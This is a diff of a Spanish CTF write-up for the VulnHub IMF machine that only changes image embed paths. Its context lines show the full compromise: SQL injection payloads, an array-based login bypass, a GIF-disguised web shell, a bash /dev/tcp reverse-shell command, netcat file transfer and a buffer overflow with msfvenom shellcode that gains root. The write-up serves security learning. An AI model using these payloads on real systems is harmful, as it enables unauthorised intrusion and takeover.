@@ -11,7 +11,7 @@ tags:
 references:
   - https://www.vulnhub.com/entry/imf-1,162/
 ---
-![[content/_WRITEUPS/CTFs/VulnHub/assets/IMF/IMF-01.webp]]
+![[IMF-01.webp]]
 # Información General  
 >Este documento contiene información detallada de cómo comprometer la máquina IMF en VulnHub. Se abordan principalmente las técnicas: **SQLi Boolean Blind** y **Buffer Overflow**.
 
@@ -92,7 +92,7 @@ Parámetros:
 - `-I`: Especifica el adaptador de red a escanear
 - `--localnet`: Indica escaneo de toda la red local
 
-![[content/_WRITEUPS/CTFs/VulnHub/assets/IMF/IMF-02.webp]]
+![[IMF-02.webp]]
 Este escaneo me identifica la máquina objetivo en "`172.16.23.129`" dentro de la red `vmnet1`.
 
 Identificamos que hay una máquina, por lo que podemos ejecutar el comando ping para verificar conexión con la máquina:
@@ -100,7 +100,7 @@ Identificamos que hay una máquina, por lo que podemos ejecutar el comando ping 
 ```bash
 ping 172.16.23.129
 ```
-![[content/_WRITEUPS/CTFs/VulnHub/assets/IMF/IMF-03.webp]]
+![[IMF-03.webp]]
 No hay conexión por medio de ping.
 
 **¿Por qué falla ping?** El comando "ping" usa el protocolo ICMP (Internet Control Message Protocol), que envía paquetes de eco para saber si un dispositivo está accesible en la red. Sin embargo, muchos sistemas o firewalls pueden bloquear estos paquetes ICMP por seguridad, por lo que "ping" puede fallar aunque el dispositivo esté activo.
@@ -111,7 +111,7 @@ Una vez compilada, ejecutamos:
 ```bash
 ./tcping 172.16.23.129
 ```
-![[content/_WRITEUPS/CTFs/VulnHub/assets/IMF/IMF-04.webp]]
+![[IMF-04.webp]]
 
 Confirmamos conexión con `172.16.23.129` por medio de la herramienta tcping.
 ### 1.2 Escaneo de puerto |  nMap
@@ -129,7 +129,7 @@ Parámetros:
 - `-Pn`: No realiza ping previo para detectar si el host está activo; asume que está activo y escanea directamente.
 - `-oA SYNscan`: Exporta la salida en tres formatos simultáneamente (normal, XML y grepable) usando el prefijo de archivo "SYNscan".
 
-![[content/_WRITEUPS/CTFs/VulnHub/assets/IMF/IMF-05.webp]]
+![[IMF-05.webp]]
 ### 1.3 Escaneo de servicios | nmap
 Ya que sabemos que tenemos el puerto 80 abierto, es el momento de utilizar un conjunto de scripts de reconocimiento que tiene nmap que nos permitirá identificar exactamente a qué nos estamos enfrentando con información más detallada.
 
@@ -143,7 +143,7 @@ Parámetros:
 - `-oA PORTscan`: Exporta la salida en tres formatos simultáneamente.
 
 
-![[content/_WRITEUPS/CTFs/VulnHub/assets/IMF/IMF-06.webp]]
+![[IMF-06.webp]]
 Resultado: Equipo con puerto 80/tcp abierto, servicio Apache httpd 2.4.18 corriendo en máquina Ubuntu | Aplicación web: IMF
 ### 1.4 Reconocimiento Web | Puerto 80
 
@@ -152,9 +152,9 @@ Introducimos la IP `172.16.23.129` como URL en nuestro navegador web y vemos que
 - **Projects** (projects.php)
 - **Contact Us** (contact.php)
 
-![[content/_WRITEUPS/CTFs/VulnHub/assets/IMF/IMF-07.webp]]
+![[IMF-07.webp]]
 #### Código Fuente | Index.php 
-![[content/_WRITEUPS/CTFs/VulnHub/assets/IMF/IMF-08.webp]]
+![[IMF-08.webp]]
 
 Encontramos unos segmentos de JavaScript encriptados en base64. Esto es bastante curioso de ver en un código fuente, porque cuando juntamos todos los segmentos obtenemos la cadena: "`ZmxhZzJ7YVcxbVlXUnRhVzVwYzNSeVlYUnZjZz09fQ==`"
 
@@ -165,30 +165,30 @@ Se identifica fácilmente que es una cadena base64, por lo que procedemos a deco
  echo "ZmxhZzJ7YVcxbVlXUnRhVzVwYzNSeVlYUnZjZz09fQ==" | base64 -d; echo
 ```
 
-![[content/_WRITEUPS/CTFs/VulnHub/assets/IMF/IMF-09.webp]]
+![[IMF-09.webp]]
 Resultado: `flag2{aW1mYWRtaW5pc3RyYXRvcg==}`
 
 Esta es otra cadena base64, vamos a decodificarla nuevamente:
 ```bash
 echo "aW1mYWRtaW5pc3RyYXRvcg==" | base64 -d; echo
 ```
-![[content/_WRITEUPS/CTFs/VulnHub/assets/IMF/IMF-10.webp]]
+![[IMF-10.webp]]
 Resultado: **imfadministrator** - Esto parece ser una ruta o directorio administrativo.
 #### Código Fuente | projects.php
 
-![[content/_WRITEUPS/CTFs/VulnHub/assets/IMF/IMF-11.webp]]
+![[IMF-11.webp]]
 Aquí no hay mucho que ver, parece una página con solo información relacionada a los proyectos de la aplicación web. No contiene datos sensibles.
 #### Código Fuente | contact.php
 
-![[content/_WRITEUPS/CTFs/VulnHub/assets/IMF/IMF-12.webp]]
+![[IMF-12.webp]]
 Esta página es mucho más interesante que las otras dos. En el formulario vemos claramente tres posibles usuarios por lo que los guardamos, seguramente sirven para más tarde.
 
-![[content/_WRITEUPS/CTFs/VulnHub/assets/IMF/IMF-13.webp]]
+![[IMF-13.webp]]
 Además, en su código fuente encontramos la `flag1{YWxsdGhlZmlsZXM=}`. Vemos que también está en `base64` por lo que procedemos a decodificarla:
 ```bash
 echo "YWxsdGhlZmlsZXM=" | base64 -d; echo
 ```
-![[content/_WRITEUPS/CTFs/VulnHub/assets/IMF/IMF-14.webp]]
+![[IMF-14.webp]]
 Resultado: **allthefiles** - Pista que nos sugiere revisar todos los archivos.
 Recuento de Información:
 
@@ -209,14 +209,14 @@ Podemos intuir que las flags son pistas para seguir con el reto. En este caso:
 - "`flag2{imfadministrator}`" nos indica lo que parece ser un directorio administrativo
 
 Confirmamos esto ingresando en la URL: `http://172.16.23.129/imfadministrator/`
-![[content/_WRITEUPS/CTFs/VulnHub/assets/IMF/IMF-15.webp]]
+![[IMF-15.webp]]
 Parece un panel de inicio de sesión administrativo. Este es el momento perfecto para probar los usuarios que habíamos encontrado anteriormente, confirmando no solo que los usuarios existen, sino que **la web también es vulnerable a enumeración de usuarios**.
 
-![[content/_WRITEUPS/CTFs/VulnHub/assets/IMF/IMF-16.webp]]
+![[IMF-16.webp]]
 Revisando el código fuente también podemos ver pistas en los comentarios de la web. Parece que dejaron toda la sanitización en el traste por lo que ya podemos a probar cosas con el Repeater de BurpSuite.
 ### 2.1 Array Injection Authentication Bypass |  BurpSuite
 
-![[content/_WRITEUPS/CTFs/VulnHub/assets/IMF/IMF-17.webp]]
+![[IMF-17.webp]]
 Con un simple `[]` (corchetes vacíos) en el parámetro de login podemos ver que la web nos da acceso al panel administrativo. Esto ocurre porque:
 
 > En PHP, cuando usas `[]` en un formulario GET o POST, conviertes un parámetro de string en un array. El backend espera un string y lo compara directamente, pero recibe un array. Dependiendo de cómo se escribe el código, esta comparación fallida puede resultar en un bypass de autenticación. Es un ejemplo clásico de cómo las suposiciones sobre el tipo de datos pueden llevar a vulnerabilidades.
@@ -227,7 +227,7 @@ Decodificamos:
 ```bash
 echo "Y29udGludWVUT2Ntcw==" | base64 -d; echo
 ```
-![[content/_WRITEUPS/CTFs/VulnHub/assets/IMF/IMF-18.webp]]
+![[IMF-18.webp]]
 Resultado: **continueTOcms** - Nueva pista hacia el CMS.
 ### 2.2 Panel Administrativo CMS
 También tenemos un enlace que nos lleva a `http://172.16.23.129/imfadministrator/cms.php?pagename=home` por lo que al ingresar podemos ver el contenido del panel administrativo:
@@ -237,10 +237,10 @@ También tenemos un enlace que nos lleva a `http://172.16.23.129/imfadministrato
 - Upload Report
 - Disavowed list
 
-![[content/_WRITEUPS/CTFs/VulnHub/assets/IMF/IMF-19.webp]]
-![[content/_WRITEUPS/CTFs/VulnHub/assets/IMF/IMF-20.webp]]
-![[content/_WRITEUPS/CTFs/VulnHub/assets/IMF/IMF-21.webp]]
-![[content/_WRITEUPS/CTFs/VulnHub/assets/IMF/IMF-22.webp]]
+![[IMF-19.webp]]
+![[IMF-20.webp]]
+![[IMF-21.webp]]
+![[IMF-22.webp]]
 No hay nada interesante en los códigos fuentes de estas páginas a simple vista. Sin embargo, hay algo crucial que pasamos por alto...
 ## 3. Preparativos para el Ataque - SQL Injection Boolean Blind
 
@@ -248,9 +248,9 @@ No hay nada interesante en los códigos fuentes de estas páginas a simple vista
 
 Nos damos cuenta de que la página tiene un parámetro interesante: `cms.php?pagename=home`. 
 
-![[content/_WRITEUPS/CTFs/VulnHub/assets/IMF/IMF-23.webp]]
+![[IMF-23.webp]]
 Ese `=` es bastante curioso ya que está apuntando a recursos, por lo que vamos a probar colocando una comilla `'` (comilla simple). Esto nos da una pantalla **WARNING** de **SQL**, confirmando que hay una inyección SQL:
-![[content/_WRITEUPS/CTFs/VulnHub/assets/IMF/IMF-24.webp]]
+![[IMF-24.webp]]
 ### 3.2 Concepto: SQL Injection Boolean Blind
 
 > SQLi es una vulnerabilidad donde un atacante inyecta código SQL malicioso en los campos de entrada de una aplicación. Si la entrada no está sanitizada, el código ejecuta consultas SQL no autorizadas.
@@ -282,7 +282,7 @@ GET /imfadministrator/cms.php?pagename=home' or 1=1--
 
 El payload de la imagen está URL-encoded al enviar las solicitudes, puedes hacerlo fácilmente con Burp Suite al presionar `Ctrl + U`.
 
-![[content/_WRITEUPS/CTFs/VulnHub/assets/IMF/IMF-25.webp]]
+![[IMF-25.webp]]
 
 Notamos que la solicitud en sí no cambia mucho visualmente, pero al leer detenidamente podemos apreciar que hay un error que dice:
 
@@ -306,13 +306,13 @@ hora probamos dos payloads específicos para confirmar el comportamiento boolean
 ```
 home' AND '1'='1'--
 ```
-![[content/_WRITEUPS/CTFs/VulnHub/assets/IMF/IMF-26.webp]]
+![[IMF-26.webp]]
 
 **Payload FALSE (debe mostrar un error o comportamiento diferente):**
 ```
 home' AND '1'='0'--
 ```
-![[content/_WRITEUPS/CTFs/VulnHub/assets/IMF/IMF-27.webp]]
+![[IMF-27.webp]]
 Con esto en cuenta podemos ver claramente dos respuestas distintas, confirmando la vulnerabilidad **Boolean Blind SQLi**.
 
 ### 3.4 Extracción Manual de Información
@@ -322,7 +322,7 @@ Por ejemplo, podemos empezar a cambiar las solicitudes por palabras:
 ```
 home' AND 'test'='test'--
 ```
-![[content/_WRITEUPS/CTFs/VulnHub/assets/IMF/IMF-28.webp]]
+![[IMF-28.webp]]
 De esta forma tenemos una forma de identificar entradas en las bases de datos. A pesar de que no veamos exactamente la entrada, tenemos una forma de ir buscando información.
 
 Supongamos que queremos buscar bases de datos, podemos usar una de las entradas para seleccionar mediante queries nombres de las mismas e ir fuzzeando las misma.
@@ -343,10 +343,10 @@ home' AND (SELECT schema_name FROM information_schema.schemata limit 0,1)='infor
 - `='information_schema'`: ¿Es igual a esto?
 
 **Estado FALSE** (nombre incorrecto):
-![[content/_WRITEUPS/CTFs/VulnHub/assets/IMF/IMF-29.webp]]
+![[IMF-29.webp]]
 
 **Estado TRUE** (confirmamos information_schema existe):
-![[content/_WRITEUPS/CTFs/VulnHub/assets/IMF/IMF-30.webp]]
+![[IMF-30.webp]]
 ✅ Confirmado: existe la BD `information_schema`.
 ### 3.6 Fuzzing letra por letra
 
@@ -362,7 +362,7 @@ home' AND (SELECT substring(schema_name,1,1) FROM information_schema.schemata li
 - `='i'`: ¿Es igual a "i"?
 
 Fíjate como ahora  seleccionamos la **primera letra** de la **primera base de datos**, sabemos que la primera BD es `information_schema`, cuya primera letra es **"i"** → **TRUE**:
-![[content/_WRITEUPS/CTFs/VulnHub/assets/IMF/IMF-31.webp]]
+![[IMF-31.webp]]
 Para la segunda letra: `substring(schema_name,2,1)='n'` y así sucesivamente.
 
 **¿Por qué funciona?** La función `substring()` extrae N caracteres desde una posición. Si probamos 'i', es TRUE. Si probamos 'x', es FALSE. **Letra por letra extraemos cualquier información**.
@@ -385,12 +385,12 @@ El script:
 
 Si quieres ver exactamente como funciona este script y estos conceptos, te recomiendo que visites el [repositorio](https://github.com/NeTenebraes/neBooleanBlindSQLi).
 
-![[content/_WRITEUPS/CTFs/VulnHub/assets/IMF/IMF-32.webp]]
+![[IMF-32.webp]]
 **Resultado**: Encontramos página oculta: `http://172.16.23.129/imfadministrator/cms.php?pagename=tutorials-incomplete`
 
 --- 
 ### 4.1 Página Descubierta: tutorials-incomplete
-![[content/_WRITEUPS/CTFs/VulnHub/assets/IMF/IMF-33.webp]]
+![[IMF-33.webp]]
 
 Hay un QR. Lo escaneamos con herramienta web segura:
 
@@ -407,7 +407,7 @@ echo "dXBsb2Fkcjk0Mi5waHA=" | base64 -d; echo
 ### 5.1 Acceso al Uploader
 
 Navegamos a `http://172.16.23.129/imfadministrator/uploadr942.php`:
-![[content/_WRITEUPS/CTFs/VulnHub/assets/IMF/IMF-34.webp]]
+![[IMF-34.webp]]
 En esta sección vemos que se pueden subir documentos, sin embargo la gran mayoría de extensiones están bloqueadas por un WAF. Por lo que usaremos un archivo de prueba para empezar a hacer fuzzing, confirmando que archivos con extensión de imagen puedes ser subidos al servidor.
 
 **¿Por qué probamos con imágenes?** A través de fuzzing de extensiones y MIME types, identificamos que:
@@ -459,13 +459,13 @@ Modificamos para el WAF:
 - ✅ MIME type: `image/gif` (permitido)
 - ✅ Magic number: `GIF8` (válido)
   
-![[content/_WRITEUPS/CTFs/VulnHub/assets/IMF/IMF-35.webp]]
+![[IMF-35.webp]]
 El archivo se guarda en el servidor. Típicamente en: `/imfadministrator/uploads/`
 
 Además, de la respuesta del servidor podemos ver que guarda los archivos con un nombre distinto (hash).
-![[content/_WRITEUPS/CTFs/VulnHub/assets/IMF/IMF-36.webp]]
+![[IMF-36.webp]]
 Confirmamos esto viendo una de las imágenes que habías subido en la ruta mencionada:
-![[content/_WRITEUPS/CTFs/VulnHub/assets/IMF/IMF-37.webp]]
+![[IMF-37.webp]]
 ### 5.6 Ejecución de Comandos
 
 Una vez que tenemos acceso a través del shell web, ejecutamos comandos con ayuda de curl:
@@ -482,8 +482,8 @@ curl "http://172.16.23.129/imfadministrator/uploads/shell.gif?cmd=whoami"
 ```
 
 **¡CONFIRMAMOS EJECUCIÓN DE COMANDOS!**
-![[content/_WRITEUPS/CTFs/VulnHub/assets/IMF/IMF-38.webp]]
-![[content/_WRITEUPS/CTFs/VulnHub/assets/IMF/IMF-39.webp]]
+![[IMF-38.webp]]
+![[IMF-39.webp]]
 >  Luego e confirmar que se puede hacer ejecución de comandos, encontramos la`flag5{YWdlbnRzZXJ2aWNlcw==}` a través del comando `ls` para posteriormente ver su contenido con `cat`. 
 
 Resultado:
@@ -516,7 +516,7 @@ El signo `&` requiere ser URL-encoded como `%26` asi como tambien los espacios y
 ```bash
 curl "http://172.16.23.129/imfadministrator/uploads/2a7475f285e3.gif?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/172.16.23.1/443%200%3E%261%27"
 ```
-![[content/_WRITEUPS/CTFs/VulnHub/assets/IMF/IMF-40.webp]]
+![[IMF-40.webp]]
 **Resultado**: CONECTADOS - Tenemos acceso a la máquina.
 ### 5.8 Estabilización de TTY
 
@@ -547,7 +547,7 @@ stty rows 40 columns 120
 ```
 
 Ahora tenemos una shell completa con capacidades interactivas dentro de la maquina IMF.
-![[content/_WRITEUPS/CTFs/VulnHub/assets/IMF/IMF-41.webp]]
+![[IMF-41.webp]]
 
 ---
 
@@ -569,13 +569,13 @@ netstat -tuln
 ```
 
 En el resultado del `ps aux` se puede observar que, aparte de los procesos estándar de sistema, existe el proceso `/usr/sbin/knockd` corriendo como root. 
-![[content/_WRITEUPS/CTFs/VulnHub/assets/IMF/IMF-42.webp]]
+![[IMF-42.webp]]
 Esto es muy relevante porque **knockd es un demonio especialmente usado para port knocking**, una técnica que sirve para proteger servicios sensibles permitiendo la apertura de puertos solo tras recibir una secuencia correcta de "golpes" en puertos definidos.
 
 > Confirmar la presencia de knockd deja muy claro que en este reto debes realizar **port knocking** para poder acceder a algún servicio protegido.  Esta observación es clave para el progreso en la máquina, porque si no ejecutas correctamente la secuencia de knocking, el puerto se mantiene cerrado.
 
 
-![[content/_WRITEUPS/CTFs/VulnHub/assets/IMF/IMF-43.webp]]
+![[IMF-43.webp]]
 Además del demonio de knockd, la salida del `netstat` nos sirve para identificar servicios adicionales — por ejemplo, el puerto `7788` utilizado por el binario vulnerable `agent`, que típicamente queda inaccesible hasta completar el knocking especificado por la máquina.​
 
 ### 6.2 Descubrimiento del servicio "Agent"
@@ -584,15 +584,15 @@ Basándonos en la `flag5{agentservices}` y el reconocimiento realizado, buscamos
 ```bash
 find / -name "*agent*" 2>/dev/null
 ```
-![[content/_WRITEUPS/CTFs/VulnHub/assets/IMF/IMF-44.webp]]
+![[IMF-44.webp]]
 
 Encontramos que existe `/usr/local/bin/agent`. Al ejecutarlo vemos que espera un ID:
-![[content/_WRITEUPS/CTFs/VulnHub/assets/IMF/IMF-45.webp]]
+![[IMF-45.webp]]
 
 Dentro del mismo directorio encontramos un archivo llamado `access_codes` que contiene: `SYN 7482,8279,9467`. Esto es una clara referencia al Port Knocking que comentamos anteriormente. 
 
 
-![[content/_WRITEUPS/CTFs/VulnHub/assets/IMF/IMF-46.webp]]
+![[IMF-46.webp]]
 ### 6.3 Análisis del Binario con ltrace
 
 `ltrace` nos permite ver las llamadas a librerías sin necesidad de desensamblar. Esto acelera el análisis. Nos permitirá rastrear llamadas a librerías dinámicamente, esto es especialmente útil para entender qué hace el programa:
@@ -606,7 +606,7 @@ Observamos que el programa:
 - Compara la entrada de ID con `48093572`
 - Realiza operaciones de buffers si la validación es exitosa
 
-![[content/_WRITEUPS/CTFs/VulnHub/assets/IMF/IMF-47.webp]]
+![[IMF-47.webp]]
 
 ### 6.4 Identificación del ID Válido
 
@@ -615,7 +615,7 @@ Ejecutamos el binario del agent:
 /usr/local/bin/agent
 # Ingresamos: 48093572
 ```
-![[content/_WRITEUPS/CTFs/VulnHub/assets/IMF/IMF-48.webp]]
+![[IMF-48.webp]]
 El binario nos presentará opciones. Seleccionamos opción 3 para explotar el buffer overflow.
 ### 6.5 Traer el equipo a la maquina
 
@@ -631,7 +631,7 @@ nc 172.16.23.1 443 < agent
 sudo nc -nlvp 443 > agent
 ```
 
-![[content/_WRITEUPS/CTFs/VulnHub/assets/IMF/IMF-49.webp]]
+![[IMF-49.webp]]
 De esta forma, podemos usar trabajar con todos nuestros juguetes con el binario, sin necesidad de depender de los paquetes que tenga la máquina objetivo.
 
 ---
@@ -660,7 +660,7 @@ Antes de explotar, verificamos las protecciones del binario:
 checksec --file=agent
 ```
 
-![[content/_WRITEUPS/CTFs/VulnHub/assets/IMF/IMF-50.webp]]
+![[IMF-50.webp]]
 **Análisis de protecciones:**
 - **NX disabled** ✓: El stack es ejecutable - nuestro shellcode funcionará
 - **No PIE** ✓: Las direcciones NO cambian entre ejecuciones - direcciones hardcoded funcionarán
@@ -702,7 +702,7 @@ O con metasploit (más preciso):
 ```
 
 Yo usaré `gef` para el ejemplo:
-![[content/_WRITEUPS/CTFs/VulnHub/assets/IMF/IMF-51.webp]]
+![[IMF-51.webp]]
 Te dejo un ejemplo usado acá:
 ```bash
 aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaac
@@ -722,7 +722,7 @@ gdb ./agent
 > **Nota**: Si es binario x86 en máquina x64, requiere: `sudo pacman -S lib32-glibc` (Arch)
 
 El programa hace crash. Revisamos el valor en el registro **EIP** (arquitecturas x86):
-![[content/_WRITEUPS/CTFs/VulnHub/assets/IMF/IMF-52.webp]]
+![[IMF-52.webp]]
 EIP contiene `0x62616172` que corresponde a "raab" en el patrón. Esto nos da información clave sobre cuántos caracteres necesitamos.
 
 ### Paso 3: Encontrar Offset Exacto
@@ -733,12 +733,12 @@ pattern search 0x62616172
 #[+] Searching for '72616162'/'62616172' with period=4
 #[+] Found at offset 168 (little-endian search) likely
 ```
-![[content/_WRITEUPS/CTFs/VulnHub/assets/IMF/IMF-53.webp]]
+![[IMF-53.webp]]
 **¡El offset es exactamente 168 bytes!**
 
 Vemos también que el buffer comienza en `0xffffd614` - donde nuestro shellcode residirá inicialmente:
 `0xffffd614  →  "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama[...]"`
-![[content/_WRITEUPS/CTFs/VulnHub/assets/IMF/IMF-54.webp]]
+![[IMF-54.webp]]
 Por lo tanto, si queremos sobrescribir el EIP, necesitamos exactamente **168 bytes de relleno + 4 bytes con la dirección deseada**. 
 ### 7.4 Obtención de la Dirección de Retorno (0x08048563)
 
@@ -749,7 +749,7 @@ Desensamblamos el binario:
 objdump -D agent | grep -A5 "call.*eax"
 ```
 
-![[content/_WRITEUPS/CTFs/VulnHub/assets/IMF/IMF-55.webp]]
+![[IMF-55.webp]]
 Encontramos una instrucción `call eax` en `0x08048563` que es perfecta porque:
 - EAX apunta al inicio de nuestro buffer (donde está el shellcode)
 - `call eax` saltará a nuestro código
@@ -777,7 +777,7 @@ msfvenom -p linux/x86/shell_reverse_tcp \
   - `\x0a`: Newline (interfiere con entrada)
   - `\x0d`: Carriage return (problemas de parsing)
 
-![[content/_WRITEUPS/CTFs/VulnHub/assets/IMF/IMF-56.webp]]
+![[IMF-56.webp]]
 
 El shellcode generado es un binario compilado que:
 1. Crea un socket TCP
@@ -896,7 +896,7 @@ uid=0(root) gid=0(root) groups=0(root)
 $ whoami
 root
 ```
-![[content/_WRITEUPS/CTFs/VulnHub/assets/IMF/IMF-57.webp]]
+![[IMF-57.webp]]
 **¡Tenemos acceso como root!**
 
 Aplicamos los pasos de estabilización de TTY nuevamente si es necesario.
@@ -908,14 +908,14 @@ Navegamos al directorio home de root y capturamos la última flag:
 ```bash
 cat /root/flag6.txt
 ```
-![[content/_WRITEUPS/CTFs/VulnHub/assets/IMF/IMF-58.webp]]
+![[IMF-58.webp]]
 **Resultado**: `flag6{R2gwc3RQcm90MGMwbHM=}`
 
 Decodificamos:
 ```bash
 echo "R2gwc3RQcm90MGMwbHM=" | base64 -d; echo
 ```
-![[content/_WRITEUPS/CTFs/VulnHub/assets/IMF/IMF-59.webp]]
+![[IMF-59.webp]]
 **Resultado**: **Gh0stProt0c0ls** - ¡Máquina completada!
 
 ---
